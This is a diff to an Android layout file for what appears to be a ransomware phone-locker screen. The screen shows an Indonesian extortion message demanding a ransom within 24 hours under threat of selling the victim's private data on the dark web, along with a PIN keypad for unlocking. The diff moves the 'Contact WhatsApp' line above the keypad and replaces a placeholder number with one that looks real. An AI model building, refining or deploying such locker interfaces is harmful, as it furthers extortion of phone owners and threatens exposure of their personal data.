@@ -44,7 +44,7 @@
             android:id="@+id/v_msg"
             android:layout_width="match_parent"
             android:layout_height="wrap_content"
-            android:layout_marginTop="10dp"
+            android:layout_marginTop="8dp"
             android:text="Segera bayar tebusan jika hp anda mau berfungsi kembali, jika tidak segera di bayar dalam waktu 24 jam data privasi anda akan kami sebarkan dan di perjual beli kan di situs dark web"
             android:textColor="#212121"
             android:textSize="14sp"
@@ -53,6 +53,16 @@
             android:gravity="center"
             android:paddingStart="5dp"
             android:paddingEnd="5dp" />
+
+        <TextView
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:layout_marginTop="8dp"
+            android:text="Contact WhatsApp: +62 831-8441-6710"
+            android:textColor="#212121"
+            android:textSize="14sp"
+            android:fontFamily="sans-serif"
+            android:textStyle="bold" />
 
         <TextView
             android:id="@+id/v_display"
@@ -92,16 +102,6 @@
             <Button android:id="@+id/v_b0" android:text="0" style="@style/KeyButton" android:textColor="#ff360c" />
             <Button android:id="@+id/v_ok" android:text="ENT" style="@style/KeyButton" android:textColor="#ff360c" />
         </GridLayout>
-
-        <TextView
-            android:layout_width="wrap_content"
-            android:layout_height="wrap_content"
-            android:layout_marginTop="8dp"
-            android:text="Contact WhatsApp: +62 812-3456-7890"
-            android:textColor="#212121"
-            android:textSize="14sp"
-            android:fontFamily="sans-serif"
-            android:textStyle="bold" />
 
         <TextView
             android:layout_width="wrap_content"
